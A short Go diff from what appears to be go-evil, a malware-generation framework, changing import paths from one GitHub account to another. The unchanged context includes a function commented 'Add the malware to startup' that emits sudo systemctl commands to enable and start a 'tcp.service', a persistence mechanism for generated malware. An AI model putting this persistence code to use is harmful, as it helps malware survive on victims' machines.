@@ -3,8 +3,8 @@ package startup
 import (
 	"fmt"
 
-	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
-	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
+	"github.com/DennisTheodoreNedry/go-evil/utility/structure/functions"
+	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
 )
 
 // Add the malware to startup
@@ -56,7 +56,7 @@ func Add(data_object *json.Json_t) []string {
 			"exec.Command(\"sudo\", \"systemctl\", \"enable\", \"tcp.service\").Run()",
 			"exec.Command(\"sudo\", \"systemctl\", \"start\", \"tcp.service\").Run()")
 
-		data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler")
+		data_object.Add_go_import("github.com/DennisTheodoreNedry/notify_handler")
 	}
 
 	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
